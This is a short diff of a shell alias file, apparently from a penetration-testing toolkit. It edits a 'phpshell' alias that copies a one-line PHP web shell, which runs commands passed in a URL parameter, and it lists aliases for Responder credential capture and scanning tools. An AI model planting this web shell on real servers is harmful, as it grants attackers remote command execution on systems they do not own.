@@ -19,6 +19,6 @@ alias scan='python3 /opt/resources/scan.py'
 alias getdns='bash /opt/tools/dnsvalidator/getdns.sh'
 alias cat='glow '
 alias responder='sudo responder -I eth0 -wFb'
-alias phpshell='echo "<?php system(\$_GET[\'cmd\']); ?>" | xclip -selection clipboard && echo "Shell PHP copié !"'
+alias phpshell='echo "<?php system(\$_GET[\"cmd\"]); ?>" | xclip -selection clipboard && echo "Shell PHP copié !"'
 alias settarget='bash /opt/tools/Exegol-history/settarget.sh'
 
